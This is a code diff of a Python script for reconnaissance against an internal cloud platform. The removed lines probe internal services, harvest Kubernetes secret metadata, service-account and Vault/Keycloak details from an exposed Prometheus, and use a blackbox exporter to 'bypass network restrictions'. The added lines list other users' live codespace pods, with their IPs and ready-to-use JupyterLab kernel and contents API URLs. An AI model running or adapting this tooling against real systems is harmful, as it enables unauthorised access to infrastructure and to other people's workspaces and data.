@@ -1,208 +1,198 @@
-import requests, socket
+#!/usr/bin/env python3
+"""
+codespaces.py
+Gets live user codespace pods and their IPs from Prometheus.
+Always up to date — Prometheus scrapes every 30s.
+"""
+import requests
+from datetime import datetime
+
 requests.packages.urllib3.disable_warnings()
 
-# Map hostnames to IPs we already know
-# (DNS may resolve inside the cluster)
-internal_services = {
-    "api":         "https://api.studio.sparrow.cloud.echonet.net.intra",
-    "front":       "https://front.studio.sparrow.cloud.echonet.net.intra",
-    "gatekeeper":  "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra",
-    "offer":       "https://offer.studio.sparrow.cloud.echonet.net.intra",
-    "project":     "https://project.studio.sparrow.cloud.echonet.net.intra",
-    "rbac":        "https://rbac.studio.sparrow.cloud.echonet.net.intra",
-    "sparrot":     "https://sparrot.studio.sparrow.cloud.echonet.net.intra",
-    "wheelbuilder":"https://wheelbuilder.studio.sparrow.cloud.echonet.net.intra",
-    "platform":    "https://platform.sparrow.cloud.net.intra",
-}
+PROMETHEUS = "http://198.18.19.18:9090"
 
-# First resolve the hostnames
-print("=== DNS Resolution ===")
-for name, url in internal_services.items():
-    hostname = url.split("//")[1]
-    try:
-        ip = socket.gethostbyname(hostname)
-        print(f"  {name:15} {hostname} -> {ip}")
-    except Exception as e:
-        print(f"  {name:15} {hostname} -> UNRESOLVABLE")
-
-# Then probe each service
-print("\n=== Service Probing ===")
-endpoints_to_try = [
-    "/",
-    "/monitoring/live",
-    "/health",
-    "/healthz", 
-    "/api/v1/",
-    "/api/v1/me",
-    "/api/v1/users",
-    "/metrics",
-    "/swagger",
-    "/openapi.json",
-    "/docs",
-]
-
-for name, base_url in internal_services.items():
-    print(f"\n[{name}] {base_url}")
-    for ep in endpoints_to_try:
-        try:
-            r = requests.get(
-                f"{base_url}{ep}",
-                verify=False,
-                timeout=5,
-                allow_redirects=False  # don't follow OAuth2 redirects
-            )
-            if r.status_code not in [404]:
-                print(f"  {r.status_code} {ep}")
-                if r.status_code == 200:
-                    print(f"    {r.text[:200]}")
-                elif r.status_code == 302:
-                    print(f"    Redirect -> {r.headers.get('Location','?')}")
-        except Exception as e:
-            print(f"  ERR {ep}: {type(e).__name__}")
-            
-            
-            
-import requests, json
-base = "http://198.18.19.18:9090"
-
-# These PromQL queries extract operational intelligence
-queries = {
-    # All k8s secrets metadata (names, namespaces — not values)
-    "k8s_secrets":
-        'kube_secret_info',
-    
-    # All running pods with images — reveals software versions
-    "all_pods":
-        'kube_pod_info',
-    
-    # Keycloak metrics — may reveal realm names, client IDs
-    "keycloak":
-        '{job=~".*keycloak.*"}',
-    
-    # OAuth2 proxy metrics — reveals protected service URLs
-    "oauth2_proxy":
-        '{container="oauth2-proxy"}',
-    
-    # All service accounts
-    "service_accounts":
-        'kube_pod_spec_serviceaccount_info',
-    
-    # External secrets — reveals what secrets are synced from vault
-    "external_secrets":
-        'externalsecret_status_condition',
-    
-    # Vault metrics if exposed
-    "vault_metrics":
-        '{__name__=~"vault.*"}',
-    
-    # Sparrow API request rates — reveals valid endpoints
-    "sparrow_api_requests":
-        '{job="sparrow-api-prod"}',
-    
-    # Gatekeeper request metrics
-    "gatekeeper_requests":
-        '{job="gatekeeper-api-prod"}',
-
-    # Redis metrics — reveals DB size, key count
-    "redis":
-        '{job=~".*redis.*"}',
-}
-
-findings = {}
-for name, query in queries.items():
-    r = requests.get(f"{base}/api/v1/query",
-                    params={"query": query},
-                    timeout=15)
-    if r.status_code == 200:
-        results = r.json()["data"]["result"]
-        findings[name] = results
-        if results:
-            print(f"\n✓ {name}: {len(results)} results")
-            # Print unique metric names and key labels
-            seen = set()
-            for res in results[:5]:
-                metric = res.get("metric", {})
-                key = f"{metric.get('__name__','')} | {metric.get('container','')} | {metric.get('namespace','')}"
-                if key not in seen:
-                    seen.add(key)
-                    print(f"  {json.dumps(metric)[:180]}")
-
-# Save all findings
-with open("prometheus_intel.json", "w") as f:
-    json.dump(findings, f, indent=2)
-print("\nSaved to prometheus_intel.json")
-
-
-
-# Blackbox exporter probes URLs on your behalf
-# This bypasses network restrictions!
-blackbox = "http://blackbox-exporter-sparrow.sparrow-tooling.svc.cluster.local:9115"
-
-# First resolve the hostname
-import socket
-try:
-    ip = socket.gethostbyname(
-        "blackbox-exporter-sparrow.sparrow-tooling.svc.cluster.local"
+def promql(query):
+    r = requests.get(
+        f"{PROMETHEUS}/api/v1/query",
+        params={"query": query},
+        timeout=30
     )
-    print(f"Blackbox exporter IP: {ip}")
-    blackbox_ip = f"http://{ip}:9115"
-except:
-    print("Cannot resolve blackbox hostname")
-    blackbox_ip = None
+    if r.status_code == 200:
+        return r.json().get("data", {}).get("result", [])
+    return []
 
-if blackbox_ip:
-    # Use blackbox to probe internal services
-    # It will tell you if they return 2xx
-    for target in [
-        "https://api.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
-        "https://rbac.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
-        "https://gatekeeper.studio.sparrow.cloud.echonet.net.intra/monitoring/live",
-    ]:
-        r = requests.get(
-            f"{blackbox_ip}/probe",
-            params={"module": "http_2xx", "target": target},
-            timeout=10
+def get_codespaces():
+    print(f"[*] Querying Prometheus — {datetime.now().strftime('%H:%M:%S')}")
+
+    # ── Source 1: Active scrape targets ───────────────────
+    # Most reliable — only shows pods currently being scraped
+    r = requests.get(
+        f"{PROMETHEUS}/api/v1/targets",
+        timeout=30
+    )
+    targets = r.json()["data"]["activeTargets"]
+
+    pods = {}  # ip → info
+
+    for t in targets:
+        labels   = t.get("labels", {})
+        pod      = labels.get("pod", "")
+        instance = labels.get("instance", "")
+        ns       = labels.get("namespace", "")
+        job      = labels.get("job", "")
+        health   = t.get("health", "?")
+
+        if not pod.startswith("sop-") or \
+           ns != "sparrow-studio-prod":
+            continue
+
+        # Extract IP from instance
+        ip = instance.split(":")[0] if ":" in instance \
+             else instance
+
+        # Extract port
+        port = instance.split(":")[1] if ":" in instance \
+               else "?"
+
+        # Parse user ID and kind from pod name
+        import re
+        uid_m  = re.search(r'sop-([a-z0-9]+)-reg', pod)
+        user_id = uid_m.group(1) if uid_m else "?"
+        kind    = "jupyterlab" if "-jl-"  in pod else \
+                  "vscode"     if "-c-3-" in pod else \
+                  "other"
+
+        # Derive prefix (base URL)
+        pfx_m  = re.search(
+            r'(sop-[a-z0-9]+-reg-[a-z]+-[a-z]--[a-f0-9]+)',
+            pod
         )
-        print(f"\nProbe {target.split('//')[1].split('/')[0]}:")
-        print(f"  Status: {r.status_code}")
-        # Parse probe result
-        for line in r.text.splitlines():
-            if 'probe_success' in line or 'probe_http_status_code' in line:
-                if not line.startswith('#'):
-                    print(f"  {line}")
-                    
-                    
-# Keycloak has a well-known discovery endpoint
-# Find Keycloak from the OAuth2 redirect URL
-# The login page showed: "Sign in with Keycloak OIDC"
+        prefix = f"/{pfx_m.group(1)}" if pfx_m else ""
 
-# Common Keycloak locations in this cluster
-keycloak_candidates = [
-    "https://keycloak.studio.sparrow.cloud.echonet.net.intra",
-    "https://auth.studio.sparrow.cloud.echonet.net.intra",
-    "https://sso.studio.sparrow.cloud.echonet.net.intra",
-    "https://iam.studio.sparrow.cloud.echonet.net.intra",
-]
+        key = f"{ip}:{port}"
+        if key not in pods:
+            pods[key] = {
+                "ip":      ip,
+                "port":    port,
+                "pod":     pod,
+                "user_id": user_id,
+                "kind":    kind,
+                "prefix":  prefix,
+                "health":  health,
+                "jobs":    [],
+            }
+        pods[key]["jobs"].append(job)
 
-for url in keycloak_candidates:
-    try:
-        hostname = url.split("//")[1]
-        ip = socket.gethostbyname(hostname)
-        print(f"RESOLVED: {hostname} -> {ip}")
-        
-        # Keycloak well-known endpoint reveals realm config
-        for realm in ["master", "sparrow", "datalab", 
-                      "sparrow-studio", "prod"]:
-            r = requests.get(
-                f"{url}/realms/{realm}/.well-known/openid-configuration",
-                verify=False, timeout=5
+    # ── Source 2: kube_service_info for ClusterIPs ────────
+    # Catches pods that may not be scraped yet
+    svc_results = promql(
+        'kube_service_info{namespace="sparrow-studio-prod"}'
+    )
+    for item in svc_results:
+        m   = item.get("metric", {})
+        svc = m.get("service", "")
+        ip  = m.get("cluster_ip", "")
+
+        if not svc.startswith("sop-") or \
+           not ip or ip == "None":
+            continue
+
+        import re
+        uid_m  = re.search(r'sop-([a-z0-9]+)-reg', svc)
+        user_id = uid_m.group(1) if uid_m else "?"
+        kind    = "jupyterlab" if "-jl-"  in svc else \
+                  "vscode"     if "-c-3-" in svc else \
+                  "other"
+        pfx_m  = re.search(
+            r'(sop-[a-z0-9]+-reg-[a-z]+-[a-z]--[a-f0-9]+)',
+            svc
+        )
+        prefix = f"/{pfx_m.group(1)}" if pfx_m else ""
+
+        key = f"{ip}:?"
+        if key not in pods:
+            pods[key] = {
+                "ip":      ip,
+                "port":    "10443",
+                "pod":     svc,
+                "user_id": user_id,
+                "kind":    kind,
+                "prefix":  prefix,
+                "health":  "svc",
+                "jobs":    [],
+            }
+
+    return pods
+
+def print_report(pods):
+    # Group by user
+    by_user = {}
+    for info in pods.values():
+        uid = info["user_id"]
+        by_user.setdefault(uid, []).append(info)
+
+    print(f"\n{'='*70}")
+    print(f"  LIVE CODESPACES — {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"  Total pods: {len(pods)} | Users: {len(by_user)}")
+    print(f"{'='*70}")
+
+    # Header
+    print(f"\n  {'USER':12} {'KIND':12} {'IP':20} "
+          f"{'PORT':6} {'PREFIX':40} {'STATUS'}")
+    print(f"  {'─'*12} {'─'*12} {'─'*20} "
+          f"{'─'*6} {'─'*40} {'─'*6}")
+
+    for uid in sorted(by_user.keys()):
+        for info in sorted(
+            by_user[uid],
+            key=lambda x: x["kind"]
+        ):
+            health = "✓" if info["health"] == "up" \
+                     else "~" if info["health"] == "svc" \
+                     else "✗"
+            print(
+                f"  {uid:12} "
+                f"{info['kind']:12} "
+                f"{info['ip']:20} "
+                f"{info['port']:6} "
+                f"{info['prefix']:40} "
+                f"{health}"
             )
-            if r.status_code == 200:
-                data = r.json()
-                print(f"  REALM FOUND: {realm}")
-                print(f"  token_endpoint: {data.get('token_endpoint')}")
-                print(f"  userinfo: {data.get('userinfo_endpoint')}")
-    except socket.gaierror:
-        pass
-    except Exception as e:
-        print(f"{url}: {type(e).__name__}: {e}")
+
+    # Quick-copy section
+    print(f"\n{'='*70}")
+    print(f"  QUICK COPY — API endpoints")
+    print(f"{'='*70}")
+    for info in sorted(pods.values(),
+                       key=lambda x: x["user_id"]):
+        if info["kind"] == "jupyterlab":
+            print(f"\n  # {info['user_id']}")
+            print(f"  http://{info['ip']}:{info['port']}"
+                  f"{info['prefix']}/api/kernels")
+            print(f"  http://{info['ip']}:{info['port']}"
+                  f"{info['prefix']}/api/contents")
+
+    # Save to file
+    outfile = f"codespaces_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    with open(outfile, "w") as f:
+        f.write(f"CODESPACES SNAPSHOT — "
+                f"{datetime.now()}\n\n")
+        f.write(f"{'USER':12} {'KIND':12} {'IP':20} "
+                f"{'PORT':6} {'PREFIX'}\n")
+        f.write(f"{'─'*80}\n")
+        for uid in sorted(by_user.keys()):
+            for info in sorted(
+                by_user[uid], key=lambda x: x["kind"]
+            ):
+                f.write(
+                    f"{uid:12} "
+                    f"{info['kind']:12} "
+                    f"{info['ip']:20} "
+                    f"{info['port']:6} "
+                    f"{info['prefix']}\n"
+                )
+    print(f"\n[*] Saved → {outfile}")
+
+if __name__ == "__main__":
+    pods = get_codespaces()
+    print_report(pods)
